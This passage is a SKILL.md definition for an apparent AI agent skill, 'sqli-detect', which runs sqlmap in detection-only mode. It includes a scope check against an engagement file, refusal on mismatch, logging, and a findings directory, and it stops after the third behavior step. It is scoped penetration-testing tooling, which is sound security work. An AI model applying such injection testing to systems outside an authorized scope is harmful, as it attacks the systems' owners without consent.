
### 5.1 SKILL.md

```markdown
---
name: sqli-detect
description: Run sqlmap in a detection-only mode against an authorized target. Never dump data by default.
inputs:
  - name: target_url
    description: Full URL including a candidate injection parameter (e.g. https://lab/app?id=1). Must be in scope.
    required: true
  - name: method
    description: HTTP method. GET or POST. Defaults to GET.
    required: false
  - name: data
    description: POST body when method=POST. Optional.
    required: false
  - name: cookie
    description: Session cookie for authenticated tests. Optional.
    required: false
allowed-tools:
  - Bash
  - Read
  - Write
---

# sqli-detect

## When to use

Use when a manual review or a scanner has flagged a parameter as a likely injection candidate and you need a defensible detection with proof-of-injection (a boolean/time/error signal), not a data dump.

## Preconditions

- `./engagement/scope.yml` includes the target host.
- `sqlmap` is installed.
- The parameter under test is one you have consent to inject.

## Behavior

1. Parse `target_url`; check the hostname against `./engagement/scope.yml`. Refuse on mismatch.
2. Log the target and parameter to `./logs/sqli-detect-<date>.log`.
3. Create `./findings/sqli-<slug>/`.
